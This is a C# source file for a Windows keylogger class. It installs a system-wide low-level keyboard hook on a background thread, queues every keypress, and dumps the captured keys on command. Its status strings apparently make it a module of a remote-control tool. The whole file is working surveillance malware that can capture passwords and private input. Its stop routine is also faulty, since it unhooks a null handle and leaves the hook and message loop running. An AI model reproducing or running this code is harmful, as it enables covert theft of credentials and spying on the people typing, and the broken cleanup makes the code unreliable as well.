using System;
using System.Collections.Concurrent;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Input
{
    public static class KeyLogger
    {
        private static readonly ConcurrentQueue<string> _log = new();
        private static Thread _hookThread;
        private static bool _running = false;

        private delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelProc _proc = HookCallback;

        public static string StartLogging()
        {
            if (_running) return "KEYLOGGER ALREADY RUNNING";

            _running = true;
            _log.Clear();

            _hookThread = new Thread(() =>
            {
                using var curProcess = System.Diagnostics.Process.GetCurrentProcess();
                using var curModule = curProcess.MainModule;
                var hModule = GetModuleHandle(curModule?.ModuleName);

                var hook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hModule, 0);
                if (hook == IntPtr.Zero) throw new Exception("Failed to set hook");

                Application.Run();
                UnhookWindowsHookEx(hook);
            })
            {
                IsBackground = true
            };
            _hookThread.SetApartmentState(ApartmentState.STA);
            _hookThread.Start();

            return "KEYLOGGER STARTED";
        }

        public static string StopLoggingAndDump()
        {
            if (!_running) return "KEYLOGGER NOT RUNNING";

            _running = false;
            UnhookWindowsHookEx(IntPtr.Zero); // Forces cleanup on next tick

            var total = "";
            while (_log.TryDequeue(out var key))
                total += key;

            return string.IsNullOrEmpty(total) ? "NO INPUT LOGGED" : $"LOGGED KEYS:\n{total}";
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                var vkCode = Marshal.ReadInt32(lParam);
                _log.Enqueue(((Keys)vkCode).ToString() + " ");
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }
    }
}
